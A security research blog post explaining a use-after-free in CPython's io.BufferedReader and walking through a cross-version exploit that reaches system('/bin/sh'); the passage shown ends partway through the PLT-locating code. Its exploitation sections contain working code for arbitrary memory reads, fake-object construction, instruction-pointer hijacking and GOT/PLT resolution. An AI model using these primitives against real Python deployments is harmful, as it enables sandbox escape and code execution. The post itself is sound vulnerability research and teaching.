<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Exploiting a Use-After-Free for code execution in every version of Python 3 | pwn.win</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="Exploiting a Use-After-Free for code execution in every version of Python 3" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="A while ago I was browsing the Python bug tracker, and I stumbled upon this bug - “memoryview to freed memory can cause segfault”. It was created in 2012, originally present in Python 2.7, but remains open to this day, 10 years later. This piqued my interest, so I decided to take a closer look." />
<meta property="og:description" content="A while ago I was browsing the Python bug tracker, and I stumbled upon this bug - “memoryview to freed memory can cause segfault”. It was created in 2012, originally present in Python 2.7, but remains open to this day, 10 years later. This piqued my interest, so I decided to take a closer look." />
<link rel="canonical" href="https://pwn.win/2022/05/11/python-buffered-reader.html" />
<meta property="og:url" content="https://pwn.win/2022/05/11/python-buffered-reader.html" />
<meta property="og:site_name" content="pwn.win" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-05-11T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Exploiting a Use-After-Free for code execution in every version of Python 3" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-11T00:00:00+00:00","datePublished":"2022-05-11T00:00:00+00:00","description":"A while ago I was browsing the Python bug tracker, and I stumbled upon this bug - “memoryview to freed memory can cause segfault”. It was created in 2012, originally present in Python 2.7, but remains open to this day, 10 years later. This piqued my interest, so I decided to take a closer look.","headline":"Exploiting a Use-After-Free for code execution in every version of Python 3","mainEntityOfPage":{"@type":"WebPage","@id":"https://pwn.win/2022/05/11/python-buffered-reader.html"},"url":"https://pwn.win/2022/05/11/python-buffered-reader.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://pwn.win/feed.xml" title="pwn.win" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">pwn.win</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Exploiting a Use-After-Free for code execution in every version of Python 3</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2022-05-11T00:00:00+00:00" itemprop="datePublished">May 11, 2022
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>A while ago I was browsing the Python <a href="https://bugs.python.org">bug tracker</a>, and  I stumbled upon this bug - “<a href="https://bugs.python.org/issue15994">memoryview to freed memory can cause segfault</a>”. It was created in 2012, originally present in Python 2.7, but remains open to this day, 10 years later. This piqued my interest, so I decided to take a closer look.</p>

<p>What follows is a breakdown of the root cause and how I wrote a reliable exploit which works in every version of Python 3.</p>

<h2 id="python-objects">Python Objects</h2>
<p>To understand anything happening in CPython it’s important to have an understanding of how objects are represented internally. I’ll give a brief introduction here, but there are several (better) resources on the internet for learning about this.</p>

<p>Everything in Python is an object. CPython represents these objects with the <code class="language-plaintext highlighter-rouge">PyObject</code> struct. Every type of object extends the basic <code class="language-plaintext highlighter-rouge">PyObject</code> struct with their own specific fields. A <code class="language-plaintext highlighter-rouge">PyObject</code> looks like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_object</span> <span class="p">{</span>
    <span class="n">Py_ssize_t</span> <span class="n">ob_refcnt</span><span class="p">;</span>
    <span class="n">PyTypeObject</span> <span class="o">*</span><span class="n">ob_type</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PyObject</span><span class="p">;</span>
</code></pre></div></div>

<p>A list, for example, is represented by a <code class="language-plaintext highlighter-rouge">PyListObject</code>, which looks roughly like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">PyObject</span> <span class="n">ob_base</span><span class="p">;</span>
    <span class="n">Py_ssize_t</span> <span class="n">ob_size</span><span class="p">;</span>
    <span class="n">PyObject</span> <span class="o">**</span><span class="n">ob_item</span><span class="p">;</span>
    <span class="n">Py_ssize_t</span> <span class="n">allocated</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PyListObject</span><span class="p">;</span>
</code></pre></div></div>

<p>We can see that every object has a refcount (<code class="language-plaintext highlighter-rouge">ob_refcnt</code>) and a pointer to its corresponding type object (<code class="language-plaintext highlighter-rouge">ob_type</code>), in <code class="language-plaintext highlighter-rouge">ob_base</code>. The type object is a singleton and there exists one for every type in the Python language. For example, an int will point to <code class="language-plaintext highlighter-rouge">PyLong_Type</code>, and a list will be point to <code class="language-plaintext highlighter-rouge">PyList_Type</code>.</p>

<p>With that out of the way, let’s look at the PoC.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The author of the bug report kindly included a proof of concept which will trigger a null pointer dereference. You can see that here:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">io</span>

<span class="k">class</span> <span class="nc">File</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">RawIOBase</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">readinto</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">buf</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">view</span>
        <span class="n">view</span> <span class="o">=</span> <span class="n">buf</span>
    <span class="k">def</span> <span class="nf">readable</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">True</span>
    
<span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">File</span><span class="p">())</span>
<span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                       <span class="c1"># get view of buffer used by BufferedReader
</span><span class="k">del</span> <span class="n">f</span>                           <span class="c1"># deallocate buffer
</span><span class="n">view</span> <span class="o">=</span> <span class="n">view</span><span class="p">.</span><span class="n">cast</span><span class="p">(</span><span class="s">'P'</span><span class="p">)</span>
<span class="n">L</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">]</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">view</span><span class="p">)</span>          <span class="c1"># create list whose array has same size
</span>                                <span class="c1"># (this will probably coincide with view)
</span><span class="n">view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>                     <span class="c1"># overwrite first item with NULL
</span><span class="k">print</span><span class="p">(</span><span class="n">L</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>                     <span class="c1"># segfault: dereferencing NULL
</span></code></pre></div></div>

<h2 id="root-cause">Root Cause</h2>
<p>The comments in the PoC provide some indication as to what is going on, but  I’ll try to break it down further.</p>

<p>This bug is a fairly typical use-after-free, but to understand it we must first understand what <code class="language-plaintext highlighter-rouge">io.BufferedReader</code> does. The <a href="https://docs.python.org/3/library/io.html#io.BufferedReader">documentation</a> does a good job of explaining it:</p>
<blockquote>
  <p>A buffered binary stream providing higher-level access to a readable, non seekable <a href="https://docs.python.org/3/library/io.html#io.RawIOBase" title="io.RawIOBase"><code class="language-plaintext highlighter-rouge">RawIOBase</code></a> raw binary stream. It inherits <a href="https://docs.python.org/3/library/io.html#io.BufferedIOBase" title="io.BufferedIOBase"><code class="language-plaintext highlighter-rouge">BufferedIOBase</code></a>.</p>

  <p>When reading data from [the BufferedReader], a larger amount of data may be requested from the underlying raw stream, and kept in an internal buffer. The buffered data can then be returned directly on subsequent reads.</p>
</blockquote>

<p>In the proof of concept we first define a class called <code class="language-plaintext highlighter-rouge">File</code>, which inherits from <code class="language-plaintext highlighter-rouge">io.RawIOBase</code>, and define some methods on it. We then create a <code class="language-plaintext highlighter-rouge">BufferedReader</code> object, specifying an instance of the custom <code class="language-plaintext highlighter-rouge">File</code> class as the underlying raw stream.</p>

<p>When the <code class="language-plaintext highlighter-rouge">BufferedReader</code> is initialized it <a href="https://github.com/python/cpython/blob/3.10/Modules/_io/bufferedio.c#L732">allocates</a> an internal buffer. When we read from the buffered reader (line 11) and the data doesn’t exist in its internal buffer, it will <a href="https://github.com/python/cpython/blob/3.10/Modules/_io/bufferedio.c#L1476">read</a> from the underlying stream. The read from the underlying stream happens via the <a href="https://docs.python.org/3/library/io.html#io.RawIOBase.readinto"><code class="language-plaintext highlighter-rouge">readinto</code></a> function, which receives a buffer as an argument, which the raw stream is supposed to read data into. The buffer passed as an argument is actually a <a href="https://docs.python.org/3/library/stdtypes.html#memoryview"><code class="language-plaintext highlighter-rouge">memoryview</code></a> which is <a href="https://github.com/python/cpython/blob/3.10/Modules/_io/bufferedio.c#L1467">backed by</a> the <code class="language-plaintext highlighter-rouge">BufferedReader</code>’s internal buffer. You can think of the <code class="language-plaintext highlighter-rouge">memoryview</code> as a pointer to, or a view of, the internal buffer.</p>

<p>Given that we control the underlying stream object, we can make the <code class="language-plaintext highlighter-rouge">readinto</code> function save a reference to this <code class="language-plaintext highlighter-rouge">memoryview</code> argument, which will persist even once we’ve returned from the function, which is exactly what the PoC does on line 6.</p>

<p>Once we have saved a reference to the <code class="language-plaintext highlighter-rouge">memoryview</code> we can delete the <code class="language-plaintext highlighter-rouge">BufferedReader</code> object. This will force the internal buffer to be <a href="https://github.com/python/cpython/blob/3.10/Modules/_io/bufferedio.c#L523">freed</a>, even though we still have a reference to our friendly <code class="language-plaintext highlighter-rouge">memoryview</code>, which is now pointing to a freed buffer.</p>

<h2 id="exploitation">Exploitation</h2>

<p>Now we have a memoryview pointing to freed heap memory, which we can read from or write to, where do we go from here?</p>

<p>The easiest approach for exploitation is to create a list with length equal to the length of the freed buffer, which will very likely have its item buffer (<code class="language-plaintext highlighter-rouge">ob_item</code>) allocated in the same place as the freed buffer. This will mean we get two different “views” on the same piece of memory. One view, the <code class="language-plaintext highlighter-rouge">memoryview</code>, thinks that the memory is just an array of bytes, which we can write to or read from arbitarily. The second view is the list we created, which thinks that the memory is a list of <code class="language-plaintext highlighter-rouge">PyObject</code> pointers. This means we can create fake <code class="language-plaintext highlighter-rouge">PyObject</code>s somewhere in memory, write their addresses into the list by writing to the <code class="language-plaintext highlighter-rouge">memoryview</code>, and then access them by indexing into the list.</p>

<p>In the case of the PoC, they write <code class="language-plaintext highlighter-rouge">0</code> to the buffer (line 16), and then access it with <code class="language-plaintext highlighter-rouge">print(L[0])</code>. <code class="language-plaintext highlighter-rouge">L[0]</code> gets the first <code class="language-plaintext highlighter-rouge">PyObject*</code> which is <code class="language-plaintext highlighter-rouge">0</code> and then <code class="language-plaintext highlighter-rouge">print</code> tries to access some fields on it, resulting in a null pointer dereference.</p>

<p>Given that this bug is present on every version of Python since at least Python 2.7, I wanted my exploit to work on as many versions of Python 3 as I could, just for fun. I decided against writing it for Python 2 because there are some differences in the languages which I didn’t want to account for in my exploit, but it’s absolutely possible to tweak my code to get this to work there. This meant that I couldn’t rely on any hardcoded offsets into the CPython binary, or into libc. Instead I chose to use known struct offsets (which haven’t changed between Python versions), some manual ELF parsing, and some known linker behaviour, to get a reliable exploit.</p>

<p>The goal of the exploit is to call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>. The steps of which are as follows:</p>
<ol>
  <li>Leak CPython binary function pointer</li>
  <li>Calculate the base address of CPython</li>
  <li>Calculate the address of <code class="language-plaintext highlighter-rouge">system</code> or its PLT stub</li>
  <li>Jump to this address with the first argument pointing to <code class="language-plaintext highlighter-rouge">/bin/sh</code></li>
  <li>Win</li>
</ol>

<h3 id="getting-a-leak">Getting a leak</h3>
<p>Leaking arbitrary amounts of data from an arbitrary location turned out to be pretty easy. We can use a specially crafted <code class="language-plaintext highlighter-rouge">bytearray</code> object. The layout of a <code class="language-plaintext highlighter-rouge">bytearray</code> looks like this:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="n">PyObject_VAR_HEAD</span>
    <span class="n">Py_ssize_t</span> <span class="n">ob_alloc</span><span class="p">;</span>   <span class="cm">/* How many bytes allocated in ob_bytes */</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">ob_bytes</span><span class="p">;</span>        <span class="cm">/* Physical backing buffer */</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">ob_start</span><span class="p">;</span>        <span class="cm">/* Logical start inside ob_bytes */</span>
    <span class="n">Py_ssize_t</span> <span class="n">ob_exports</span><span class="p">;</span> <span class="cm">/* How many buffer exports */</span>
<span class="p">}</span> <span class="n">PyByteArrayObject</span><span class="p">;</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">ob_bytes</code> is a pointer to a heap-allocated buffer. When we read from or write to the bytearray, we’re reading/writing to this heap buffer. If we can craft a fake <code class="language-plaintext highlighter-rouge">bytearray</code> object, and we can set <code class="language-plaintext highlighter-rouge">ob_bytes</code> to point to an arbitrary address, then we can read or write to this arbitrary address by reading or writing to this <code class="language-plaintext highlighter-rouge">bytearray</code>.</p>

<p>Crafting fake objects is made very easy by CPython. If you create a <code class="language-plaintext highlighter-rouge">bytes</code> object (this is not the same thing as a <code class="language-plaintext highlighter-rouge">bytearray</code>), the raw data within the <code class="language-plaintext highlighter-rouge">bytes</code> object is always present 32 bytes after the start of the <code class="language-plaintext highlighter-rouge">PyBytesObject</code>, in one contiguous chunk. We can get the address of the <code class="language-plaintext highlighter-rouge">PyBytesObject</code> with the <code class="language-plaintext highlighter-rouge">id</code> function, and we know the offset to our data, so we can do something like this:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span>
        <span class="sa">b</span><span class="s">'AAAAAAAA'</span><span class="p">,</span>    <span class="c1"># refcount
</span>        <span class="sa">b</span><span class="s">'BBBBBBBB'</span><span class="p">,</span>    <span class="c1"># type object pointer
</span>        <span class="sa">b</span><span class="s">'CCCC'</span>         <span class="c1"># other object data...
</span>    <span class="p">])</span>
<span class="n">address_of_fake_object</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">fake</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span>
</code></pre></div></div>

<p>Now <code class="language-plaintext highlighter-rouge">address_of_fake_object</code> will be the address of <code class="language-plaintext highlighter-rouge">AAAAAAAABBBBBBBBCCCC...</code>.</p>

<p>The final leak primative is shown below. Note that <code class="language-plaintext highlighter-rouge">self.freed_buffer</code> is the <code class="language-plaintext highlighter-rouge">memoryview</code> pointing to the freed heap buffer, and <code class="language-plaintext highlighter-rouge">self.fake_objs</code> is the list we created whose item buffer also points to the freed heap buffer.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">_create_fake_byte_array</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">byte_array_obj</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
        <span class="n">p64</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span>            <span class="c1"># refcount
</span>        <span class="n">p64</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">)),</span> <span class="c1"># type obj
</span>        <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">),</span>          <span class="c1"># ob_size
</span>        <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">),</span>          <span class="c1"># ob_alloc
</span>        <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span>          <span class="c1"># ob_bytes
</span>        <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">),</span>          <span class="c1"># ob_start
</span>        <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span>           <span class="c1"># ob_exports
</span>    <span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">no_gc</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte_array_obj</span><span class="p">)</span> <span class="c1"># stop gc from freeing after we return
</span>    <span class="bp">self</span><span class="p">.</span><span class="n">freed_buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">byte_array_obj</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span>

<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">_create_fake_byte_array</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
    <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">fake_objs</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="n">length</span><span class="p">]</span>
</code></pre></div></div>
<h3 id="finding-the-base-of-cpython">Finding the base of cpython</h3>
<p>Now we have a leak primitive we can use it to find the base address of the binary. For this we need a function pointer into the binary. One object which hasn’t obviously changed in any version of Python 3, and has a function pointer into the CPython binary, is the <a href="https://github.com/python/cpython/blob/3.10/Objects/longobject.c#L5622"><code class="language-plaintext highlighter-rouge">PyLong_Type</code></a> object. I chose to use the <code class="language-plaintext highlighter-rouge">tp_dealloc</code> member, at offset 24, which points to the <code class="language-plaintext highlighter-rouge">type_dealloc</code> function at runtime, but I could have just as easily chose another pointer in the same object, or in another object entirely.</p>

<p style="text-align: center;"><img src="/assets/python-buffered-reader/int_type_obj.png" alt="The type object of an `int` object at runtime" width="500" /></p>

<p>Once we have a pointer into the binary, we can round it down to the nearest page and then walk backwards one page at a time until we find the ELF header. This works because we know that the binary will be mapped at a page aligned address.</p>

<p>All of this looks like:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_bin_base</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="c1"># Leak tp_dealloc pointer of PyLong_Type which points into the Python
</span>    <span class="c1"># binary.
</span>    <span class="n">leak</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">leak</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="nb">int</span><span class="p">),</span> <span class="mi">32</span><span class="p">)</span>
    <span class="n">cpython_binary_ptr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">32</span><span class="p">])</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">cpython_binary_ptr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>  <span class="c1"># page align the address
</span>    <span class="c1"># Work backwards in pages until we find the start of the binary
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
        <span class="n">nxt</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">nxt</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">ELF'</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">addr</span>
        <span class="n">addr</span> <span class="o">-=</span> <span class="n">PAGE_SIZE</span>
    <span class="k">return</span> <span class="bp">None</span>
</code></pre></div></div>

<h3 id="instruction-pointer-control">Instruction pointer control</h3>
<p>Recall that every <code class="language-plaintext highlighter-rouge">PyObject</code> has a pointer to its type object, e.g. a <code class="language-plaintext highlighter-rouge">PyLongObject</code> has a pointer to <code class="language-plaintext highlighter-rouge">PyLong_Type</code>, and a <code class="language-plaintext highlighter-rouge">PyListObject</code> has a pointer to <code class="language-plaintext highlighter-rouge">PyList_Type</code>. Every type object effectively functions as a vtable (amongst other things), which means there are lots of nice function pointers there. With this information its clear that if we can fake a <code class="language-plaintext highlighter-rouge">PyObject</code> and point it to a fake type object, and cause one of the vtable functions to be called, we can get control of the instruction pointer.</p>

<p>This is easy to set up with the aforementioned trick for creating fake objects, and we can trigger the <code class="language-plaintext highlighter-rouge">tp_getattro</code> function pointer by attempting to access a field on the fake object.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">set_rip</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">obj_refcount</span><span class="o">=</span><span class="mh">0x10</span><span class="p">):</span>
    <span class="s">"""Set rip by using a fake object and associated type object."""</span>
    <span class="c1"># Fake type object
</span>    <span class="n">type_obj</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
        <span class="n">p64</span><span class="p">(</span><span class="mh">0xac1dc0de</span><span class="p">),</span>    <span class="c1"># refcount
</span>        <span class="sa">b</span><span class="s">'X'</span><span class="o">*</span><span class="mh">0x68</span><span class="p">,</span>          <span class="c1"># padding
</span>        <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span><span class="p">,</span>      <span class="c1"># vtable funcs 
</span>    <span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">no_gc</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">type_obj</span><span class="p">)</span>

    <span class="c1"># Fake PyObject
</span>    <span class="n">data</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
        <span class="n">p64</span><span class="p">(</span><span class="n">obj_refcount</span><span class="p">),</span>  <span class="c1"># refcount
</span>        <span class="n">p64</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">type_obj</span><span class="p">)),</span>  <span class="c1"># pointer to fake type object
</span>    <span class="p">)</span>
    <span class="bp">self</span><span class="p">.</span><span class="n">no_gc</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="c1"># The bytes data starts at offset 32 in the object 
</span>    <span class="bp">self</span><span class="p">.</span><span class="n">freed_buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Now we trigger it. This calls tp_getattro on our fake type object
</span>        <span class="bp">self</span><span class="p">.</span><span class="n">fake_objs</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">trigger</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="c1"># Avoid messy error output when we exit our shell
</span>        <span class="k">pass</span>
</code></pre></div></div>

<p>I provide a way to set the refcount of the fake object because when calling a function from the vtable, the first argument to the function is a pointer to the object itself, and if the vtable function is actually <code class="language-plaintext highlighter-rouge">system</code>, then the the first bytes of the object are going to be interpreted as the command to execute. Therefore when creating the fake object for calling <code class="language-plaintext highlighter-rouge">system</code>, we can set the refcount to <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>.</p>

<h3 id="locating-system">Locating system</h3>

<p>All versions of Python import <code class="language-plaintext highlighter-rouge">system</code> from libc. So, assuming Python is dynamically linked, we know that there’ll be an entry in the PLT for <code class="language-plaintext highlighter-rouge">system</code>, we just need to work out the address of this entry to be able to call it. Fortunately we can work this out through some parsing of the ELF structures.</p>

<p>The steps to do this are as follows:</p>
<ul>
  <li>Use our arbitrary leak to leak the ELF headers</li>
  <li>Parse the <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#Program_header">program headers</a> looking for the header of type <code class="language-plaintext highlighter-rouge">PT_DYNAMIC</code>. This will give us the address of the <code class="language-plaintext highlighter-rouge">.dynamic</code> section</li>
  <li>Parse the <code class="language-plaintext highlighter-rouge">.dynamic</code> section, extracting the <code class="language-plaintext highlighter-rouge">DT_JMPREL</code>, <code class="language-plaintext highlighter-rouge">DT_SYMTAB</code>, <code class="language-plaintext highlighter-rouge">DT_STRTAB</code>, <code class="language-plaintext highlighter-rouge">DT_PLTGOT</code> and <code class="language-plaintext highlighter-rouge">DT_INIT</code> values, which give us the addresses of the various structures we need</li>
  <li>Walk the relocation table, for each item get the offset into the symbol table, and use that to get the offset into the string table which gives the corresponding function name</li>
  <li>Keep walking the relocation table until we find the entry corresponding to <code class="language-plaintext highlighter-rouge">system</code>.</li>
</ul>

<p>The key piece of information that we want to know from this is the index in the relocation table of the <code class="language-plaintext highlighter-rouge">system</code> symbol. The linker is kind enough to place GOT and PLT entries in the same order as they exist in the relocation table, which means that once we have the index of the <code class="language-plaintext highlighter-rouge">system</code> entry we can work out its address in the GOT and the address of its PLT stub.</p>

<h4 id="full-relro">Full RELRO</h4>

<p>If the binary is full RELRO then we know that all of the function addresses have already been resolved, this means that we can just read the <code class="language-plaintext highlighter-rouge">system</code> address from the GOT using our arbitary leak.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">system_addr</span> <span class="o">=</span> <span class="n">got_address</span> <span class="o">+</span> <span class="n">system_idx</span><span class="o">*</span><span class="mi">8</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">got_address</code> conveniently comes from the <code class="language-plaintext highlighter-rouge">DT_PLTGOT</code> entry in the <code class="language-plaintext highlighter-rouge">.dynamic</code> section, and <code class="language-plaintext highlighter-rouge">system_idx</code> is what we just worked out by walking the relocation table.</p>

<p>We can determine whether the binary is full RELRO or not by reading the 2nd and 3rd entries in the GOT, which would normally be the address of the linkmap and <code class="language-plaintext highlighter-rouge">dl_runtime_resolve</code>, respectively. If they are both <code class="language-plaintext highlighter-rouge">0</code> then we can assume the binary is full RELRO, because the loader doesn’t waste its time setting up the resolution pointers/code in the PLT if nothing needs resolving at runtime.</p>

<h4 id="partial--no-relro">Partial / No RELRO</h4>

<p>If the binary is partial or no RELRO then the address of <code class="language-plaintext highlighter-rouge">system</code> needs to be resolved at runtime. For us this just means we will jump to the relevant PLT stub which will do the resolution and then call the function, instead of reading the function address from the GOT and calling it ourselves.</p>

<p>We can work out the address of the PLT stub like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">system_plt</span> <span class="o">=</span> <span class="n">plt_address</span> <span class="o">+</span> <span class="n">system_idx</span><span class="o">*</span><span class="n">SIZEOF_PLT_STUB</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">SIZEOF_PLT_STUB</code> is always 16 bytes, which means the only remaining unknown in this equation is the PLT address. As far as I could tell there’s no structure in an ELF which stores the address of this, which means we have to use some trickery to find it. Fortunately all of the linkers I encountered always place the PLT directly after the <code class="language-plaintext highlighter-rouge">.init</code> section, the address of which we know from the <code class="language-plaintext highlighter-rouge">DT_INIT</code> entry in the <code class="language-plaintext highlighter-rouge">.dynamic</code> section. We also know that on x86-64 the first instruction in the PLT is always of the form <code class="language-plaintext highlighter-rouge">push qword ptr [rip + offset]</code>, the opcode for which is <code class="language-plaintext highlighter-rouge">ff35</code>. So we can search past the end of the <code class="language-plaintext highlighter-rouge">.init</code> section for the <code class="language-plaintext highlighter-rouge">ff35</code> bytes, and wherever we find them is presumably the start of the PLT.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">init_data</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">leak</span><span class="p">(</span><span class="n">init</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
<span class="n">plt_offset</span> <span class="o">=</span> <span class="bp">None</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">init_data</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">init_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xff\x35</span><span class="s">'</span><span class="p">:</span>  <span class="c1"># push [rip+offset]
</span>        <span class="n">plt_offset</span> <span class="o">=</span> <span class="n">i</span>
